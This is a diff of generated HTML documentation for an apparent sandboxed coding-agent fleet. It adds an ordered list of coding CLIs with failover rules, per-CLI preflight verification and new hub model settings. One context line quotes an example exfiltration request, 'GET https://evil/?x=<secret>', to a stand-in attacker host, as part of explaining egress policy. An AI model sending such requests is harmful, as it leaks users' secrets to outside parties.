@@ -1865,6 +1865,17 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#the-fleets-ordered-cli-list" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The fleet's ordered CLI list
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#opencode-through-the-hub-model-router" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -2233,6 +2244,17 @@
   
     <nav class="md-nav" aria-label="The coding CLI in the sandbox">
       <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-fleets-ordered-cli-list" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The fleet's ordered CLI list
+      
+    </span>
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#opencode-through-the-hub-model-router" class="md-nav__link">
@@ -2817,11 +2839,76 @@ axis, because <code>GET https://evil/?x=&lt;secret&gt;</code> is exfiltration wi
    action feed, memory summary eligibility, and OTLP export.</li>
 </ol>
 <h2 id="the-coding-cli-in-the-sandbox">The coding CLI in the sandbox<a class="headerlink" href="#the-coding-cli-in-the-sandbox" title="Permanent link">&para;</a></h2>
+<h3 id="the-fleets-ordered-cli-list">The fleet's ordered CLI list<a class="headerlink" href="#the-fleets-ordered-cli-list" title="Permanent link">&para;</a></h3>
+<p>Which coding CLIs the fleet runs is hub configuration: <code>MAC_CODING_AGENTS</code> on the
+hub, an ordered comma list (known CLIs: <code>opencode</code>, <code>claude</code>; default
+<code>opencode</code>). Workers inherit it. The hub projects its list, and its
+<code>MAC_CLAUDE_MODEL</code> and <code>MAC_JUDGE_MODEL</code> when set, into every assignment as
+<code>metadata.runtime.coding_policy</code> (a task cannot carry its own), and returns the
+same document as <code>coding_policy</code> on every heartbeat. A worker reads its own
+<code>MAC_CODING_AGENTS</code> only if the hub has issued none, and reports that as a local
+override.</p>
+<p>For each task the executor runs the first CLI on the list that works on that
+host, and moves to the next only on a structured route failure:</p>
+<table>
+<thead>
+<tr>
+<th>Failure class</th>
+<th>When</th>
+<th>Detected by</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>agent_binary_missing</code></td>
+<td>the CLI is not on the execution PATH</td>
+<td>detector, before the run</td>
+</tr>
+<tr>
+<td><code>not_configured</code></td>
+<td>no hub URL to route through</td>
+<td>detector, before the run</td>
+</tr>
+<tr>
+<td><code>inference_token_unavailable</code></td>
+<td>no worker or inference token</td>
+<td>detector, before the run</td>
+</tr>
+<tr>
+<td><code>preflight_failed</code></td>
+<td>the in-sandbox preflight did not echo the sentinel</td>
+<td>preflight, before the run</td>
+</tr>
+<tr>
+<td><code>route_auth_failed</code></td>
+<td>the run failed and the hub router's last call on that CLI's route got 401/403</td>
+<td>the task's <code>llm.route</code> records</td>
+</tr>
+<tr>
+<td><code>route_rate_limited</code></td>
+<td>the same, with 429</td>
+<td>the task's <code>llm.route</code> records</td>
+</tr>
+<tr>
+<td><code>route_upstream_unavailable</code></td>
+<td>the same, with a 5xx or an unreachable upstream (502)</td>
+<td>the task's <code>llm.route</code> records</td>
+</tr>
+</tbody>
+</table>
+<p>The route records are the hub router's own per-request <code>llm.route</code> entries
+(<code>/v1/chat/completions</code> for opencode, <code>/v1/messages</code> for Claude Code); no
+transcript is read. A failing test, a judge's <code>not_met</code> or a bad diff is the
+task's outcome and never moves the list. Each CLI runs at most once per attempt,
+and the next one continues in the same workspace. The task board shows each skip
+and failover as a hub <code>status</code> message, and the evidence manifest records the
+order and every run under <code>coding_agents</code>.</p>
+<p>Inside one route, provider failover is the hub router's job, across the providers
+in <code>MAC_ROUTER_PROVIDERS</code>.</p>
 <h3 id="opencode-through-the-hub-model-router">opencode through the hub model router<a class="headerlink" href="#opencode-through-the-hub-model-router" title="Permanent link">&para;</a></h3>
-<p>MAC supports exactly one coding CLI: opencode. It gets its model from the hub's
-OpenAI-compatible router (<code>$MAC_HUB_URL/v1</code>), which fails over across the
-providers in <code>MAC_ROUTER_PROVIDERS</code>. Provider failover lives only there; the
-executor never re-runs a task on a different CLI.</p>
+<p>opencode gets its model from the hub's OpenAI-compatible router
+(<code>$MAC_HUB_URL/v1</code>). Claude Code uses the router's Anthropic-shaped
+<code>/v1/messages</code> with the same per-task token.</p>
 <p>The worker token never enters the sandbox: it can claim tasks and write the
 ledger. Instead, for each task:</p>
 <ol>
@@ -2871,11 +2958,13 @@ on a real in-sandbox preflight</strong>: a throwaway sandbox runs opencode under
 live policy with a short-lived inference token and must echo a sentinel back,
 proving end to end that the <strong>binary exists, the token is accepted, and egress
 to the hub router is permitted</strong> in the sandbox.</p>
-<p>The worker runs this probe before dispatch and publishes a secret-free
-<code>mac.coding_clis.v2</code> heartbeat record with a single <code>opencode</code> entry: provider,
+<p>The worker runs this probe for every CLI on the list before dispatch and
+publishes a secret-free <code>mac.coding_clis.v2</code> heartbeat record with one entry
+per listed CLI (and the list itself under <code>order</code>): provider,
 wire protocol, endpoint, authentication kind/source, model, route fingerprint,
 and the matching <code>mac.coding_agent.verification.v1</code> result. Repository dispatch
-to an OpenShell agent requires a fresh successful proof for that entry. A
+to an OpenShell agent requires a fresh successful proof for at least one CLI
+on the hub's list. A
 task-pinned model also requires proof for that exact model. Presence of the
 binary and a hub credential is only <code>configured</code>; it is never <code>verified</code>.</p>
 <p>A failed probe carries a <code>failure_class</code> in that
@@ -3015,9 +3104,24 @@ sandbox</strong>:</p>
 <td>master switch; <code>0</code> disables the coding route and the executor fails closed</td>
 </tr>
 <tr>
+<td><code>MAC_CODING_AGENTS</code></td>
+<td><code>opencode</code></td>
+<td>hub setting: the fleet's ordered coding-CLI list (<code>opencode</code>, <code>claude</code>), inherited by workers</td>
+</tr>
+<tr>
+<td><code>MAC_CLAUDE_MODEL</code></td>
+<td><code>claude-opus-4-8</code></td>
+<td>hub setting, inherited: the model Claude Code runs on</td>
+</tr>
+<tr>
+<td><code>MAC_JUDGE_MODEL</code></td>
+<td><code>claude-opus-4-8</code></td>
+<td>hub setting, inherited: the independent judge's model</td>
+</tr>
+<tr>
 <td><code>MAC_CODING_AGENT</code></td>
-<td><em>(opencode)</em></td>
-<td><code>off</code> disables the coding route; any value other than <code>opencode</code> is ignored</td>
+<td><em>(unset)</em></td>
+<td>deprecated; <code>off</code> still disables the coding route</td>
 </tr>
 <tr>
 <td><code>MAC_CODING_AGENT_SANDBOX</code></td>
